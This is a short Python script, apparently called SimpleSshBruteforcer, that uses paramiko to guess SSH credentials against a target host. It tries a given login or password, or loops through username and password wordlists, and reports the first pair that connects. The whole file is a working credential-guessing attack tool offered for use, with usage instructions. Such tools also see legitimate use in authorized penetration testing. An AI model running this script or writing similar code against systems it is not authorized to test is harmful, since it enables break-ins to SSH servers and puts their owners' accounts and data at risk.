#     WELCOME TO SIPLESSHBRUTEFORCER
#     Script is written for UNIX OS. Running on others may cause problems with wordlist path or encoding
#     requirements   python3, paramiko
import paramiko
import sys


def bruteforce(target, port, pas, paslist, log, loglist):

    sshServer = paramiko.SSHClient()
    sshServer.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    sshServer.load_system_host_keys()

    if paslist == False and loglist == True:
        with open(f"{log}", "r") as loginlist:
            for login in loginlist:
                login = login.replace("\n", "")
                try:
                    sshServer.connect(target, int(port), username=login, password=pas, timeout=0.5)
                except:
                    print(f"{login} is wrong.....")
                else:
                    print(f'succesfuly conected with creds(log:pas) {login}:{pas}')
                    break

    elif paslist == True and loglist == False:
        with open(f"{pas}", "r") as passlist:
            for password in passlist:
                password = password.replace("\n", "")
                try:
                    sshServer.connect(target, int(port), username=log, password=password, timeout=0.5)
                except:
                    print(f"{password} is wrong....")
                else:
                    print(f'succesfuly conected with creds(log:pas) {log}:{password}')
                    break

    elif paslist == True and loglist == True:
        with open(f"{log}", "r") as loginlist:
            for login in loginlist:
                login = login.replace("\n", "")
                with open(f"{pas}", "r") as passlist:
                    for password in passlist:
                        password = password.replace("\n", "")
                        try:
                            sshServer.connect(target, int(port), username=login, password=password, timeout=0.5)
                        except:
                            print(f"CREDS {login}:{password} are wrong.....")
                        else:
                            print(f'succesfuly conected with creds(log:pas) {login}:{password}')
                            return

    else:
        try:
            sshServer.connect(target, int(port), username=log, password=pas, timeout=0.5)
        except:
            print(f"CREDS: {log}:{pas} are wrong try passlist (-P) option")
        else:
            print(f'succesfuly conected with creds(log:pas) {log}:{pas}')

    sshServer.close()


if __name__ == '__main__':
    args = sys.argv
    if len(args) < 6 or "-h" in args:
        print("USAGE    python SimpleSshBruteforcer <ip> -l/L <login/pathtologinlist> -p/P <password/pathtopasslist>\nOPTIONAL  -port (default is 22)")
    else:
        target = args[1]
        port = 22
        if "-port" in args:
            port = int(args[args.index("-port") + 1])
        if "-p" in args:
            pas = args[args.index("-p") + 1]
            paslist = False
        elif "-P" in args:
            pas = args[args.index("-P") + 1]
            paslist = True
        if "-l" in args:
            log = args[args.index("-l") + 1]
            loglist = False
        elif "-L" in args:
            log = args[args.index("-L") + 1]
            loglist = True

        bruteforce(target, port, pas, paslist, log, loglist)
